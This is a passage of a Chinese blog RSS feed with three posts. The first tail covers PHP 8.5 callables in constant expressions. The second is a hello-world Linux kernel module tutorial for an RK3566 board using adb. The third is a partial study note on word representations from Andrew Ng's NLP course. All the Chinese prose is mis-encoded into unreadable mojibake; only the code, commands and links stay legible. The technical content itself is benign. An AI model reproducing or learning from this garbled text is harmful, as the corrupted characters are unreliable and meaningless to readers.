<li>ä½¿ç¨å¸¸é/ç±»å¸¸é</li>
<li>æèåè¿è¡æ¶éç½®ï¼èä¸æ¯åè£å®æ¯å¸¸é</li>
</ul>
<p>ç±»ä¼¼å°ï¼ç®­å¤´å½æ°å¨å¸¸éè¡¨è¾¾å¼ä¸­è¢«é»æ­¢ï¼å ä¸ºå®ä»¬éå¼æè·åéã</p>
<h3 id="é·é±-bå¨éç½®ééèå¯ä½ç¨">é·é± Bï¼å¨"éç½®"ééèå¯ä½ç¨</h3>
<p>å¦æä½ ç"æ³¨åè¡¨"é­åå¼å§å IOãè®¿é®æ°æ®åºãè¯»åç¯å¢åéç­ï¼ä½ å°±è®©éç½®åå¾ä¸å¯é¢æµäºã</p>
<p>ä¸ä¸ªå¥½è§åï¼</p>
<p>å¦æå¯è°ç¨å¯¹è±¡åçä¸åªæ¯"è®¡ç®å¹¶è¿å"ï¼èèæå®ç§»å°çæ­£çæå¡ä¸­ï¼éè¿éææ¹æ³å¼ç¨å®ï¼æå®¹å¨æ¥çº¿ï¼ã</p>
<h3 id="é·é±-cå¨çº¯æ°æ®æ´æ¸æ°çå°æ¹ç¨å¯è°ç¨éç½®">é·é± Cï¼å¨çº¯æ°æ®æ´æ¸æ°çå°æ¹ç¨å¯è°ç¨éç½®</h3>
<p>ä»ä»å ä¸ºä½ è½å¨å±æ§éæ¾ä»£ç ï¼ä¸æå³çä½ åºè¯¥è¿æ ·åã</p>
<p>å¦æä½ çè§åå¯ä»¥è¡¨è¾¾ä¸ºç®åæ°æ®ââç¨æ°æ®ãä¾å­ï¼</p>
<ul>
<li>åè®¸çè§è²</li>
<li>æ°å­èå´</li>
<li>æä¸¾éå</li>
</ul>
<p>å¯è°ç¨éç½®åºè¯¥æ¯ä½ çå·¥å·ï¼ç¨äºæ°æ®æ¬èº«åå¾ç¬¨æçæåµï¼æèä½ å¦åä¼åæä¸ä¸ªå­ç¬¦ä¸²è¡¨è¾¾å¼ DSLï¼ã</p>
<h3 id="é·é±-då¢éé´çå¯è¯»æ§åä¸è´æ§">é·é± Dï¼å¢éé´çå¯è¯»æ§åä¸è´æ§</h3>
<p>å¯è°ç¨éç½®ä»ç¶æ¯ä»£ç ãå¦æä½ çå¢éç»éªæ°´å¹³ä¸ä¸ï¼ä½ éè¦çº¦å®ï¼</p>
<ul>
<li>ä¿æå¸¸éè¡¨è¾¾å¼é­åç®ç­ã</li>
<li>å½é­åè¶è¿çº¦ 10 è¡æ¶ï¼å¾åäºå½åé»è¾å¹¶éè¿ FCC å¼ç¨å®ï¼<code>SomeClass::somePolicy(...)</code>ï¼ã</li>
<li>é¿åè±å¨åæ³ï¼ç¹å«æ¯åµå¥å¿åå½æ°ï¼ã</li>
</ul>
<h2 id="æåä»ä¹æ¶åéç½®åºè¯¥ä¿ææ°æ®ä»ä¹æ¶åå¯è°ç¨éç½®æ¯åçç">æåï¼ä»ä¹æ¶åéç½®åºè¯¥ä¿æ"æ°æ®"ï¼ä»ä¹æ¶å"å¯è°ç¨éç½®"æ¯åçç</h2>
<p>è¿æ¯ä¸å¥å¨å®éä»£ç åºä¸­éå¸¸ææä¸éçå®ç¨æåã</p>
<p><strong>å¨ä»¥ä¸æåµå¾åäºçº¯æ°æ®éç½®ï¼</strong></p>
<ul>
<li>è§åæ¯éæä¸å°çï¼æ å¿ãåè¡¨ãéå¼ï¼</li>
<li>ä½ æ³è¦å®¹æåºååï¼æ¯å¦å¯¼åºéç½®ï¼</li>
<li>ä½ æ³è®©éå¼åèå¯ä»¥ç¼è¾éç½®ï¼å¨æäºç»ç»ä¸­ï¼</li>
</ul>
<p>ä¾å­ï¼</p>
<pre><code class="language-php">final class Limits
{
    public const MAX_TITLE_LENGTH = 120;
    public const ALLOWED_SORTS = ['newest', 'popular', 'discussed'];
}
</code></pre>
<p><strong>å¨ä»¥ä¸æåµä½¿ç¨å¯è°ç¨éç½®ï¼</strong></p>
<ul>
<li>è§åç®åä½ä¸è½å¾å¥½å°æ å°å°æ°æ®ï¼æ¯å¦è°è¯ï¼</li>
<li>ä½¿ç¨æ°æ®ä¼æä½ æ¨åèªå®ä¹ DSL</li>
<li>ä½ æ³éè¿å±æ§è®©éç½®é è¿ç±»/æ¹æ³</li>
<li>ä½ æ³è¦éæå®å¨çå¯è°ç¨å¯¹è±¡èä¸æ¯å­ç¬¦ä¸²</li>
</ul>
<p>è¿æ­£æ¯ PHP 8.5 å¨å±æ§ãé»è®¤å¼åå¸¸éä¸­å¯ç¨çã</p>
<p><strong>ä¿æå¯è°ç¨éç½®å®å¨ä¸å¯ç»´æ¤ï¼</strong></p>
<ul>
<li>è®©é­åéæï¼åæ­£æ¯å¿é¡»çï¼ã</li>
<li>ä¸è¦è¯å¾æè·å¤é¨åéï¼<code>use(...)</code> ä¸åè®¸ï¼ã</li>
<li>å½é»è¾å¢é¿æ¶ï¼æå®ç§»å°å½åçéææ¹æ³å¹¶ç¨ FCC å¼ç¨å®ï¼PHP 8.5 ç°å¨å¨å¸¸éè¡¨è¾¾å¼ä¸­åè®¸è¿æ ·åã</li>
<li>åªå¨æ¯æçå½¢å¼ä¸­ä½¿ç¨ FCCï¼<code>function_name(...)</code> å <code>ClassName::methodName(...)</code>ï¼ä¸æ¯ææ°ç»å¯è°ç¨è¯­æ³ï¼ã</li>
</ul>
<h3 id="å³äºæ§è½å-opcache-çè¯´æ">å³äºæ§è½å opcache çè¯´æ</h3>
<p>å¦æä½ æ³ç¥éè¿æ¯å¦"åè´¹"ï¼ä¸¤ä¸ª RFC é½æå° opcache éè¦è°æ´æè½æ­£ç¡®å°å¨å±äº«åå­ä¸­å­å¨è¿äºé­å/å¯è°ç¨å¯¹è±¡ã</p>
<p>æ¢å¥è¯è¯´ï¼è¿ä¸ªç¹æ§çå®ç°èèäºçå®ä¸ççè¿è¡æ¶ç¯å¢ï¼opcache/JITï¼ãç®æ ä¸æ¯å¾®ä¼åââèæ¯è¡¨è¾¾ååå®å¨æ§ã</p>
<h2 id="å°ç»">å°ç»</h2>
<p>PHP 8.5 æ¯æå¸¸éè¡¨è¾¾å¼ä¸­çéæé­ååä¸ç­å¯è°ç¨å¯¹è±¡ï¼è¿æ¯é£ç§å¨æ´æ°æ¥å¿ä¸çèµ·æ¥å¾å°ãç¶åæææ¹åä½ è®¾è®¡ API æ¹å¼çç¹æ§ï¼</p>
<ul>
<li>é»è®¤åè°åå¾å¹²åä¸ç±»åæ­£ç¡®ï¼ä¸ç¨å¯ç©ºæ ·æ¿ï¼ã</li>
<li>å±æ§å¯ä»¥æºå¸¦çæ­£çå¯æ§è¡ç­ç¥é»è¾ââä¸ç¨å­ç¬¦ä¸² DSLã</li>
<li>æ³¨åè¡¨åè·¯ç±æ å°å¯ä»¥å®ä¹ä¸ºå¸¸éï¼ä½¿ç¨éæå®å¨çå¯è°ç¨å¯¹è±¡ã</li>
</ul>
<p>çº¦æå°±æ¯æ¤æ ï¼ä¸è½æè·åéãæ²¡æ <code>$this</code>ãå¸¸éè¡¨è¾¾å¼ä¸­æ²¡æç®­å¤´å½æ°ã</p>
<p>å¦æä½ æ¥åè¿äºæ¤æ ï¼ä½ ä¼å¾å°ä¸ä¸ªçæ­£æ´å¥½ç"ç¼è¯æ¶é£æ ¼"éç½®å±ââæ¥çº¿æ¯éæçãå¯è¯»çãéææ´å®å¨ã</p>
<p>ç¨å®æ¥ç§»é¤è¶æ°´ä»£ç ï¼èä¸æ¯éèå¤ææ§ãä¿æå¯è°ç¨éç½®ç®ç­ï¼ç»éçä¸è¥¿å½åï¼è®©ä½ çå¸¸éæè¿°"åçä»ä¹"ï¼èä¸æ¯æå®ä»¬åæè¿·ä½ åºç¨ç¨åºã</p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-17 08:10">2026-01-17 08:09</span>&nbsp;
<a href="https://www.cnblogs.com/catchadmin">JaguarJack</a>&nbsp;
éè¯»(<span id="post_view_count">10</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19494966);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19494966', targetLink: 'https://www.cnblogs.com/catchadmin/p/19494966', title: 'PHP 8.5 é­ååä¸ç­å¯è°ç¨å¯¹è±¡è¿å¥å¸¸éè¡¨è¾¾å¼' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ ç¼åä¸ä¸ªBuildroot é©±å¨ ]]></title>
    <link>https://www.cnblogs.com/tianwuyvlianshui/p/19494280</link>
    <guid>b580055d9c8ea13289397c39cb1f8618</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/tianwuyvlianshui/p/19494280" title="åå¸äº 2026-01-16 22:45">
    <span role="heading" aria-level="2">ç¼åä¸ä¸ªBuildroot é©±å¨</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="ç¼åä¸ä¸ªbuildroot-é©±å¨æ¨¡å">ç¼åä¸ä¸ªBuildroot é©±å¨æ¨¡å</h1>
<p>ç±äºBuildroot ä¸æ¯æssh</p>
<p>æéç¨adbè°è¯</p>
<h2 id="adbè¿æ¥">adbè¿æ¥</h2>
<h3 id="ååºè®¾å¤">ååºè®¾å¤</h3>
<pre><code>adb devices
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224244254-2021753310.png" alt="image-20260116202202616" loading="lazy"></p>
<h3 id="è¿æ¥è®¾å¤">è¿æ¥è®¾å¤</h3>
<pre><code>adb shell
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224245370-1464333835.png" alt="image-20260116202213317" loading="lazy"></p>
<h2 id="é©±å¨æ¨¡åç¼è¯äº¤åç¼è¯">é©±å¨æ¨¡åç¼è¯(äº¤åç¼è¯)</h2>
<h3 id="é©±å¨æ¨¡åæºç ">é©±å¨æ¨¡åæºç </h3>
<pre><code class="language-c">#include &lt;linux/module.h&gt;     /* æ¨¡åç¸å³å®åå½æ° */
#include &lt;linux/kernel.h&gt;     /* printkæ¥å¿å½æ° */

/* å è½½å½æ°ï¼é©±å¨å¥å£ï¼ï¼å½é©±å¨è¢« insmod å è½½æ¶èªå¨æ§è¡ */
static int __init helloworld_init(void)
{
    printk("helloworld_init\r\n"); // åæ ¸æ¥å¿æå°
    return 0; // è¿å0ä»£è¡¨å è½½æå
}

/* å¸è½½å½æ°ï¼é©±å¨åºå£ï¼ï¼å½é©±å¨è¢« rmmod å¸è½½æ¶èªå¨æ§è¡ */
static void __exit helloworld_exit(void)
{
    printk("helloworld_exit\r\n");
}

/* ä¸é¢è¿ä¸¤è¡ï¼åè¯åæ ¸å¥å£ååºå£åå«æ¯åªä¸¤ä¸ªå½æ° */
module_init(helloworld_init);
module_exit(helloworld_exit);

/* è¿3ä¸ªæ¯æ¨¡åä¿¡æ¯å£°æ */
MODULE_LICENSE("GPL v2");               /* æ¨¡åè®¸å¯è¯ */
MODULE_VERSION("1.0");                  /* æ¨¡åçæ¬ï¼å¯é */
MODULE_DESCRIPTION("helloworld Driver");/* æ¨¡åæè¿°ï¼å¯éï¼ä¸è¬ç¨äº lsmod æ¶æ¾ç¤º */
</code></pre>
<p>åè½ç®åè§£éå°±æ¯</p>
<blockquote>
<p>å è½½é©±å¨ï¼æå°<strong>helloworld_init</strong></p>
<p>å¸è½½é©±å¨ï¼æå°<strong>helloworld_exit</strong></p>
</blockquote>
<p>æ¾å°äº¤åç¼è¯å·¥å·è·¯å¾</p>
<pre><code>find prebuilts -name "*gcc" -type f
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224245922-1390693708.png" alt="image-20260116221419705" loading="lazy"></p>
<p>ä¸è¬å¨SDKè·¯å¾ä¸æ¾</p>
<h3 id="éç½®makefile">éç½®Makefile</h3>
<pre><code class="language-makefile"># ç®æ æ¶æ
# RK3566 æ¯ ARM64 æ¶æ
ARCH ?= arm64

# äº¤åç¼è¯å·¥å·é¾åç¼
# æç»ä¼ä½¿ç¨ï¼aarch64-linux-gnu-gcc / ld / objcopy ç­
CROSS_COMPILE ?= aarch64-linux-gnu-

# Linux åæ ¸æºç ç®å½
# å¿é¡»æ¯å·²ç»éç½®å¹¶ä¸æ§è¡è¿ prepare/modules_prepare çåæ ¸
#ä½ç¨ï¼åè¯ Makefile ç¨åªä¸ªåæ ¸çæ¬çæºç åå¤´æä»¶è¿è¡ç¼è¯é¾æ¥ã
KDIR := $(HOME)/Desktop/SDK/kernel

# å½åå¤é¨æ¨¡åæºç æå¨ç®å½
# åæ ¸ä¼å¨è¿ä¸ªç®å½ä¸æ¥æ¾ obj-m æå®çæ¨¡åæºç 
PWD  := $(shell pwd)

# è¦ç¼è¯çå¤é¨åæ ¸æ¨¡å
# hello_world.c  â  hello_world.ko
obj-m += hello_world.o

# é»è®¤ç®æ ï¼ç¼è¯åæ ¸æ¨¡å
all:
	# è°ç¨åæ ¸æºç ç®å½ä¸ç Makefile
	# M=$(PWD) è¡¨ç¤ºè¿æ¯ä¸ä¸ªâå¤é¨æ¨¡åâ
	# ARCH / CROSS_COMPILE æå®ç®æ æ¶æåäº¤åç¼è¯å¨
	$(MAKE) -C $(KDIR) M=$(PWD) \
		ARCH=$(ARCH) CROSS_COMPILE=$(CROSS_COMPILE) modules

# æ¸çç¼è¯çæçä¸­é´æä»¶
clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean

</code></pre>
<p>PSï¼ä¸»è¦å¯»æ¾éç½®</p>
<blockquote>
<p>äº¤åç¼è¯å·¥å·é¾åç¼ï¼aarch64-linux-gnu-</p>
<p>Linux åæ ¸æºç ç®å½è·¯å¾ï¼$(HOME)/Desktop/SDK/kernel</p>
</blockquote>
<h3 id="ç¼è¯">ç¼è¯</h3>
<pre><code>make
</code></pre>
<p>æ¨¡åè¾åºè·¯å¾</p>
<p><img src="https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224246555-359569486.png" alt="image-20260116222818781" loading="lazy"></p>
<h2 id="é©±å¨æµè¯">é©±å¨æµè¯</h2>
<h3 id="å°é©±å¨å¤å¶è¿rk3566æ¿å¡">å°é©±å¨å¤å¶è¿rk3566æ¿å¡</h3>
<h4 id="ä½¿ç¨adb">ä½¿ç¨ADB</h4>
<p>å¦æADBå·²ç»è¿ä¸æ¿å¡ï¼ååæ­å¼è¿æ¥</p>
<pre><code>exit
</code></pre>
<p>å¯»æ¾æ¿å¡è®¾å¤</p>
<pre><code>adb devices
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224247234-648064983.png" alt="image-20260116223436138" loading="lazy"></p>
<p>å°æ¬å°çé©±å¨æ¨¡åæä»¶åéå°æ¿å¡</p>
<pre><code>adb -s 6c392aca38ad7c4b push F:\Desktop\SSH_Ubuntu18\hello_world.ko /data/local/tmp/hello_world.ko
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224248167-2138743187.png" alt="image-20260116223652779" loading="lazy"></p>
<h3 id="å è½½é©±å¨æ¨¡å">å è½½é©±å¨æ¨¡åï¼</h3>
<pre><code>insmod hello_world.ko	
</code></pre>
<p>æ¥ç é©±å¨ ç¸å³æ¥å¿</p>
<pre><code>dmesg | grep -E 'hello'	
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224248958-58986670.png" alt="image-20260116223813105" loading="lazy"></p>
<h3 id="å¸è½½æ¨¡åé©±å¨">å¸è½½æ¨¡åé©±å¨</h3>
<pre><code>rmmod hello_world.ko
</code></pre>
<p>æ¥ç é©±å¨ ç¸å³æ¥å¿</p>
<pre><code>dmesg | grep -E 'hello'	
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260116224249850-1462602200.png" alt="image-20260116223939679" loading="lazy"></p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-16 22:45">2026-01-16 22:45</span>&nbsp;
<a href="https://www.cnblogs.com/tianwuyvlianshui">æ²æç¦»</a>&nbsp;
éè¯»(<span id="post_view_count">8</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19494280);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19494280', targetLink: 'https://www.cnblogs.com/tianwuyvlianshui/p/19494280', title: 'ç¼åä¸ä¸ªBuildroot é©±å¨' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ å´æ©è¾¾æ·±åº¦å­¦ä¹ è¯¾ç¨äºï¼èªç¶è¯­è¨å¤ç  ç¬¬äºå¨ï¼è¯åµå¥ï¼ä¸ï¼è¯æ±è¡¨å¾åç±»æ¯æ¨ç ]]></title>
    <link>https://www.cnblogs.com/Goblinscholar/p/19494158</link>
    <guid>58f8cfee352e66315e876301b5be9c0d</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/Goblinscholar/p/19494158" title="åå¸äº 2026-01-16 21:41">
    <span role="heading" aria-level="2">å´æ©è¾¾æ·±åº¦å­¦ä¹ è¯¾ç¨äºï¼èªç¶è¯­è¨å¤ç  ç¬¬äºå¨ï¼è¯åµå¥ï¼ä¸ï¼è¯æ±è¡¨å¾åç±»æ¯æ¨ç</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>æ­¤åç±»ç¨äºè®°å½å´æ©è¾¾æ·±åº¦å­¦ä¹ è¯¾ç¨çå­¦ä¹ ç¬è®°ã<br>
è¯¾ç¨ç¸å³ä¿¡æ¯é¾æ¥å¦ä¸ï¼</p>
<ol>
<li>åè¯¾ç¨è§é¢é¾æ¥ï¼<a href="https://www.bilibili.com/video/BV1FT4y1E74V?buvid=XU762317353676D786954061C192FE625463B&amp;from_spmid=playlist.playlist-detail.0.0&amp;is_story_h5=false&amp;mid=zqernykrmpf7XfIorMR%2FnA%3D%3D&amp;plat_id=116&amp;share_from=ugc&amp;share_medium=android&amp;share_plat=android&amp;share_session_id=ce0bc526-db69-428a-962e-c65ed8c267bc&amp;share_source=COPY&amp;share_tag=s_i&amp;spmid=united.player-video-detail.0.0&amp;timestamp=1713085655&amp;unique_k=DfBgvFW&amp;up_id=8654113&amp;vd_source=e035e9878d32f414b4354b839a4c31a4" target="_blank" rel="noopener nofollow">[åè¯­å­å¹]å´æ©è¾¾æ·±åº¦å­¦ä¹ deeplearning.ai</a></li>
<li>githubè¯¾ç¨èµæï¼å«è¯¾ä»¶ä¸ç¬è®°:<a href="https://github.com/robbertliu/deeplearning.ai-andrewNG" target="_blank" rel="noopener nofollow">å´æ©è¾¾æ·±åº¦å­¦ä¹ æå­¦èµæ</a></li>
<li>è¯¾ç¨éå¥ç»ä¹ ï¼ä¸­è±ï¼ä¸ç­æ¡ï¼<a href="https://blog.csdn.net/u013733326/article/details/79827273" target="_blank" rel="noopener nofollow">å´æ©è¾¾æ·±åº¦å­¦ä¹ è¯¾åä¹ é¢ä¸ç­æ¡</a></li>
</ol>
<p>æ¬ç¯ä¸ºç¬¬äºè¯¾çç¬¬äºå¨åå®¹ï¼<a href="https://www.bilibili.com/video/BV1FT4y1E74V?spm_id_from=333.788.videopod.episodes&amp;vd_source=e035e9878d32f414b4354b839a4c31a4&amp;p=163" target="_blank" rel="noopener nofollow">2.1</a><strong>å</strong><a href="https://www.bilibili.com/video/BV1FT4y1E74V?spm_id_from=333.788.videopod.episodes&amp;vd_source=e035e9878d32f414b4354b839a4c31a4&amp;p=165" target="_blank" rel="noopener nofollow">2.3</a>çåå®¹ä»¥åä¸äºåºç¡çè¡¥åã</p>
<hr>
<p>æ¬å¨ä¸ºç¬¬äºè¯¾çç¬¬äºå¨åå®¹ï¼ä¸ CV ç¸å¯¹åºçï¼è¿ä¸è¯¾ææåå®¹çä¸­å¿åªæä¸ä¸ªï¼<strong>èªç¶è¯­è¨å¤çï¼Natural Language Processingï¼NLPï¼</strong>ã<br>
åºç¨å¨æ·±åº¦å­¦ä¹ éï¼å®æ¯ä¸é¨ç¨æ¥è¿è¡<strong>ææ¬ä¸åºåä¿¡æ¯å»ºæ¨¡</strong>çæ¨¡ååææ¯ï¼æ¬è´¨ä¸æ¯å¨å¨è¿æ¥ç½ç»ä¸ç»è®¡è¯­è¨æ¨¡ååºç¡ä¸çä¸æ¬¡âç»æåç¹åâï¼ä¹æ¯äººå·¥æºè½ä¸­<strong>æè´´è¿äººç±»æç»´è¡¨è¾¾æ¹å¼</strong>çéè¦ç ç©¶æ¹åä¹ä¸ã<br>
<strong>è¿ä¸æ´èè¯¾åæ ·æ¶åå¤§ééè¦åå¤æ¶åçåå®¹ï¼æ¨ªè·¨æºå¨å­¦ä¹ ãæ¦çç»è®¡ãçº¿æ§ä»£æ°ä»¥åè¯­è¨å­¦ç´è§ã</strong><br>
è¯­è¨ä¸åå¾åé£æ ·âç´è§å¯è§âï¼æ´å¤æ¯æ½è±¡ç¬¦å·ä¸ä¸ä¸æå³ç³»çç»åï¼å æ­¤<strong>çè§£é¨æ§åèæ´é«</strong>ã<br>
å æ­¤ï¼æåæ ·ä¼å°½éè¡¥è¶³å¿è¦çèæ¯ç¥è¯ï¼å°½å¯è½ç¨æ¯å»åå®ä¾éä½çè§£é¾åº¦ã<br>
æ¬å¨çåå®¹å³äºè¯åµå¥ï¼æ¯ä¸ç§<strong>ç¸å¯¹äºç¬ç­ç¼ç ï¼æ´è½ä¿çè¯­ä¹ä¿¡æ¯çææ¬ç¼ç æ¹å¼</strong>ãéè¿è¯åµå¥ï¼æ¨¡åä¸ååªæ¯âè®°ä½âè¯æ¬èº«ï¼èæ¯è½å¤<strong>åºäºè¯­ä¹å³ç³»è¿è¡æ³å</strong>ï¼å¨ä¸å®ç¨åº¦ä¸å®ç°ç±»ä¼¼â<strong>ä¸¾ä¸åä¸</strong>âçææãè¯åµå¥æ¯ NLP é¢åä¸­æéè¦çåºç¡ææ¯ä¹ä¸ã</p>
<p>æ¬ç¯çåå®¹å³äº<strong>è¯æ±è¡¨å¾åç±»æ¯æ¨ç</strong>ï¼æ¯è¯åµå¥ä¸­çåºç¡åå®¹ã</p>
<h1 id="1è¯æ±è¡¨å¾">1.è¯æ±è¡¨å¾</h1>
<p>åç¨ä¸å¥è¯ç®åæ¦æ¬ä¸ä¸ï¼è¯æ±è¡¨å¾çå«ä¹æ¯<strong>å°è¯æ±è¡¨ç¤ºä¸ºå¤ç»´ç¹å¾åéï¼ä»¥ä¾¿æ¨¡åå¯¹è¯è¯­è¿è¡è®¡ç®ä¸æ¯è¾</strong>ã<br>
è¿ä¹æ¯è¯åµå¥æ¹æ³æéµå¾ªçæ ¸å¿ææ³ä¹ä¸ï¼ä¸é¢å°±æ¥è¯¦ç»å±å¼ï¼</p>
<h2 id="11-ç¬ç­ç¼ç å¨åºåç¼ç ä¸­çå±é">1.1 ç¬ç­ç¼ç å¨åºåç¼ç ä¸­çå±é</h2>
<p>å¨<a href="https://www.cnblogs.com/Goblinscholar/p/19449622" target="_blank">ä¸å¨çå¼å¥</a>ä¸­ï¼æä»¬å°±å¯¹ç¬ç­ç¼ç å¨åºåç¼ç ä¸­çä¸äºå±éæææåï¼åç®åéå¤ä¸ä¸ï¼ç¬ç­åéçç»´åº¦æé«ãä¸æåº¦ç¨çå¸¦æ¥äº<strong>æé«çå­å¨åè®¡ç®ææ¬</strong>ï¼è¿ä¸é®é¢å¨è¯å¸è§æ¨¡è¶å¤§çä»»å¡ä¸­ä¾¿è¶è¢«å¸æ¾ã</p>
<p>ä½æä»¬ç¥éï¼è¿ç§ææ¬ä¸çé®é¢å¾å¾å¹¶ä¸æ¯æ ¹æ¬é®é¢æå¨ï¼ææ¶çè³å¯ä»¥å¿½ç¥ï¼æä»¬å³æ³¨ä¸é¨ææ¯å¥½ä¸å¥½ï¼æ´å¤çæ¯å¨ä¹å®çâæçâï¼ä¹å°±æ¯å¯¹æç»æ§è½çæåã<br>
å æ­¤ï¼å¨åºåä¿¡æ¯çè¡¨ç¤ºä¸ï¼ç¬ç­ç¼ç çæ ¸å¿å±éå¹¶éææ¬ï¼èæ¯<strong>å®éå¶äºææ¬çè¯­ä¹è¡¨ç¤ºï¼æ æ³æ¾å¼å»ºæ¨¡è¯è¯­ä¹é´çè¯­ä¹å³ç³»</strong>ã<br>
è¿ç¹å¹¶ä¸é¾çè§£ï¼æä»¬ç¨è¯¾ç¨éçä¾å­æ¥è¯´æä¸ä¸ï¼<br>
<img src="https://img2024.cnblogs.com/blog/3708248/202601/3708248-20260116214001746-2081259111.png" alt="image.png" loading="lazy"><br>
å°±åå¾éæç¤ºï¼æ¢å¥è¯æ¥æ»ç»ï¼<strong>ç¬ç­ç¼ç å°åä¸ªè¯æ±âå­¤ç«âäºï¼æ­ç»äºè¹æåæ©å­ãç¶äº²åæ¯äº²ãç·äººåå¥³äººè¿æ ·çè¯æ±é´çèç³»ã</strong><br>
æ¾ç¶ï¼è¿å¯¹æ¨¡åæ³åè½åçå½±åæ¯æå¤§çï¼è¿ä¹æ¯ç¬ç­ç¼ç å¨åºåè¡¨ç¤ºä¸­çæ ¸å¿é®é¢æå¨ã</p>
<p>è¿ä¸ªé®é¢çè§£å³æ¹æ³å°±æ¯ä½¿ç¨è¯æ±è¡¨å¾ã</p>
<h2 id="12-è¯æ±çç¹å¾åè¡¨ç¤º">1.2 è¯æ±çç¹å¾åè¡¨ç¤º</h2>
<p>è¿ç¹åæ ·å¾ç¬¦åæä»¬çè¯­è¨ç´è§ï¼<strong>æ¢ç¶æä»¬ç¥éåä¸ªè¯æ±é´å­å¨å±æ§ãå­å¨æäºç»´åº¦ä¸çç¸ä¼¼ï¼é£å°±åå½çº³æ»ç»æå®ä»¬åä¸¾åºæ¥</strong>ï¼å°±åè¿æ ·ï¼<br>
<img src="https://img2024.cnblogs.com/blog/3708248/202601/3708248-20260116213945597-2048528454.png" alt="image.png" loading="lazy">ä»¥æ§å«ç¹å¾ä¸ºä¾ç®åè§£éä¸ä¸ï¼æä»¬å°ç·æ§è®¾ç½®ä¸º -1ï¼æå¥³æ§è®¾ç½®ä¸º 1ï¼ä»¥æ­¤ä¸ºå°ºåº¦ä¼°éå¶ä»è¯æ±å¨æ§å«ç»´åº¦ä¸çå¼ï¼å°±å¯ä»¥åç°ï¼å½çå¨è¯¥ç»´åº¦ä¸æ´æ¥è¿ç·æ§ï¼èçååæ´æ¥è¿å¥³æ§ï¼<strong>å¨è¿ç§ç¤ºæä¸ï¼è¹æç­ä¸æ§å«æ å³æä¸ä»¥æ§å«ä¸ºæ ¸å¿ç¹å¾çè¯æ±å¨è¯¥ç»´åº¦ä¸çå¼åæ¥è¿ 0 ã</strong></p>
<p><strong>ä½æ¯ï¼è¿éè¦ä¸é¨å¼ºè°ä¸ç¹ï¼è¿äºç¹å¾ä¸æ¯æä»¬äººä¸ºæå·¥å®ä¹çï¼æä»¬è¿éåªæ¯ä»¥æ­¤è¿è¡æ¼ç¤ºãå¨å®éè¿è¡ä¸­ï¼è¯æ±å¨åä¸ªç»´åº¦ä¸çå¼æ¯éè¿ç¸åºçç½ç»å­¦ä¹ å¹¶è¾åºçï¼å¶åä¸ªç»´åº¦ä¸çè¯­ä¹å¹¶ä¸å·å¤è¿æ ·è¾å¼ºçå¯è§£éæ§ã</strong><br>
å¨ä¹åæä»¬ä¹ä¼è¯¦ç»å±å¼ç¸å³åå®¹ã</p>
<p>å¨è¿ä¸é¨åï¼å´æ©è¾¾èå¸è¿æåäºä¸ç§ç®æ³ï¼<strong>t-SNE ç®æ³</strong>ï¼è¿ç§ç®æ³æ¯ä¸ç§æé«ç»´åéâæå¹³âå° 2D / 3D å¹³é¢ä¸ï¼å¹¶å°½éä¿çâå±é¨ç¸ä¼¼å³ç³»âç<strong>å¯è§å</strong>æ¹æ³ï¼<strong>æä»¬å¯ä»¥ä»¥æ­¤æ¥å¯è§ååä¸ªè¯æ±å¨åéç©ºé´ä¸­çå¤§è´è·ç¦»</strong>ï¼å°±åè¿æ ·ï¼<br>
<img src="https://img2024.cnblogs.com/blog/3708248/202601/3708248-20260116213945275-1056991747.png" alt="image.png" loading="lazy"><br>
è¿ä¸ªç®æ³çåçæ¶åå°å¾å¤æ²¡æå°è¿çæ°å­¦æ¦å¿µï¼è¯¦ç»ä»ç»éè¦å¤§éç¯å¹ï¼èä¸<strong>ç®åä¹æäºå¾å¤çè®ºæ´ä¼çåç±»åæ¹æ³</strong>ï¼å æ­¤å°±ä¸å¨è¿éå±å¼äºï¼ä»¥åå¦æææºä¼åä¸é¨ä»ç»è¿ç±»åå®¹ï¼è¿ééä¸åè®ºæé¾æ¥ï¼<a href="https://www.cs.toronto.edu/~hinton/absps/tsnefinal.pdf" target="_blank" rel="noopener nofollow">Visualizing Data using tâSNE</a></p>
<p>æç»ï¼éè¿ä¸ä¸ªè¯æ±å¨å¤ä¸ªç»´åº¦ä¸çè¡¨ç¤ºï¼æä»¬å°±éè¿å¦ä¸ç§æ¹å¼å®ç°äºå¯¹è¯æ±çç¼ç ã<br>
